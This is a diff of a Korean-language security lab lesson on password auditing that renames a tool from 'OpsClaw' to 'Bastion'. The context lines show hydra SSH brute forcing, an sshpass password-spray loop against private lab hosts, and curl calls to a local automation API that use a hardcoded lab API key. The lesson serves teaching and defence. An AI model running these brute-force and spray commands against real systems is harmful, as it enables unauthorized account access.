@@ -278,14 +278,14 @@ fi
 head -1000 /usr/share/wordlists/rockyou.txt > /tmp/small_wordlist.txt 2>/dev/null
 
 # 실습 환경 비밀번호 추가 (테스트 목적)
-echo -e "1\nadmin\npassword\nroot\ntest\nopsclaw\nubuntu" >> /tmp/small_wordlist.txt
+echo -e "1\nadmin\npassword\nroot\ntest\nbastion\nubuntu" >> /tmp/small_wordlist.txt
 
 # 사전 파일 크기 확인
 wc -l /tmp/small_wordlist.txt
 # 예상 출력: ~1007 lines
 
 # 사용자명 리스트 생성
-echo -e "root\nadmin\nopsclaw\nweb\nsecu\nsiem\nubuntu\ntest" > /tmp/users.txt
+echo -e "root\nadmin\nbastion\nweb\nsecu\nsiem\nubuntu\ntest" > /tmp/users.txt
 ```
 
 > **결과 해석**:
@@ -349,7 +349,7 @@ hydra -L /tmp/users.txt -P /tmp/small_wordlist.txt ssh://10.20.30.80 -t 4 -f 2>&
 # 패스워드 스프레이: 비밀번호 "1"을 모든 서버의 모든 사용자에 시도
 echo "=== 패스워드 스프레이 공격 ==="
 for host in 10.20.30.1 10.20.30.80 10.20.30.100; do
-    for user in root admin web secu siem opsclaw; do
+    for user in root admin web secu siem bastion; do
         result=$(sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 ${user}@${host} "echo SUCCESS" 2>/dev/null)
         if [ "$result" = "SUCCESS" ]; then
             echo "  [SUCCESS] ${user}@${host} password: 1"
@@ -517,25 +517,25 @@ done
 echo "[완료] 패스워드 공격 체인 종료"
 ```
 
-### Step 2: OpsClaw를 활용한 자동화
+### Step 2: Bastion를 활용한 자동화
 
-> **실습 목적**: 패스워드 감사를 OpsClaw로 자동화한다.
+> **실습 목적**: 패스워드 감사를 Bastion로 자동화한다.
 >
 > **배우는 것**: 보안 감사 자동화의 실제 적용
 
 ```bash
 RESULT=$(curl -s -X POST http://localhost:8000/projects \
   -H "Content-Type: application/json" \
-  -H "X-API-Key: opsclaw-api-key-2026" \
+  -H "X-API-Key: bastion-api-key-2026" \
   -d '{"name":"week04-password-audit","request_text":"패스워드 보안 감사","master_mode":"external"}')
 PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
 
-curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
-curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: bastion-api-key-2026" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: bastion-api-key-2026" > /dev/null
 
 curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
   -H "Content-Type: application/json" \
-  -H "X-API-Key: opsclaw-api-key-2026" \
+  -H "X-API-Key: bastion-api-key-2026" \
   -d '{
     "tasks": [
       {"order":1,"title":"SSH 인증방식 확인","instruction_prompt":"nmap --script=ssh-auth-methods -p 22 10.20.30.80 2>/dev/null | tail -10","risk_level":"low","subagent_url":"http://localhost:8002"},
@@ -592,7 +592,7 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 - [ ] Linux shadow 해시 구조($y$, $6$ 등)를 이해했는가
 - [ ] SQLi → 해시 추출 → 크래킹 → 접근의 전체 체인을 수행했는가
 - [ ] 패스워드 정책(PAM, SSH 설정)을 점검했는가
-- [ ] OpsClaw를 통해 패스워드 감사를 자동화했는가
+- [ ] Bastion를 통해 패스워드 감사를 자동화했는가
 - [ ] 방어 기법(키 인증, 비밀번호 정책, 계정 잠금)을 이해했는가
 
 ## 자가 점검 퀴즈
